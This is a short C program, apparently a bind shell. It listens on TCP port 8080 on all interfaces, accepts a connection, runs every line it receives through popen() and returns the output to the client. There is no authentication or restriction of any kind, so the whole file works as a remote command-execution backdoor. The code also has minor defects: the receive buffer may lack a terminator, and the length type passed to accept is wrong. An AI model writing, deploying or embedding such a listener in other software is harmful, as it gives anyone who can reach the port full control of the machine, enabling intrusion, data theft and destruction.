#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <signal.h>

// Declare socket file descriptors globally for closing in signal handler
int sockfd, new_sockfd;

void signal_handler(int);
void handle_error(char* msg);

int main(int argc, char **argv) {
    int clilen;
    char buffer[255];

    struct sockaddr_in serv_addr, cli_addr;
    socklen_t client;    

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        handle_error("Error creating socket");
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    serv_addr.sin_addr.s_addr = INADDR_ANY;

    if(bind(sockfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) == - 1) {
        handle_error("Binding Failed!");
    }

    if(listen(sockfd, 5) == -1) {
        handle_error("Cannot listen to port!");
    }

    clilen = sizeof(cli_addr);
    new_sockfd = accept(sockfd, (struct sockaddr*) &cli_addr, &clilen);

    if(new_sockfd == -1) {
        handle_error("Error on Accept");
    } else {
        printf("Server accepted connection from client\n");
    }

    signal(SIGINT, signal_handler);

    while(1) {
        memset(buffer, 0, sizeof(buffer));
        recv(new_sockfd, buffer, sizeof(buffer), 0);
        buffer[strcspn(buffer, "\n")] = '\0';  // Trim newlines

        char output[1024] = {0};

        FILE *fp = popen(buffer, "r");
        if(fp != NULL) {
          while(fgets(output, sizeof(output) - 1, fp) != NULL) {
            send(new_sockfd, output, strlen(output), 0);
          }
          pclose(fp);
        }
    }

    close(sockfd);
    close(new_sockfd);
    return 0;
}

void handle_error(char* msg) {
    perror(msg);
    exit(1);
}

void signal_handler(int signum) {
    printf("\nClosing sockets and exiting...\n");
    close(new_sockfd); 
    close(sockfd); 
    exit(EXIT_SUCCESS);
}
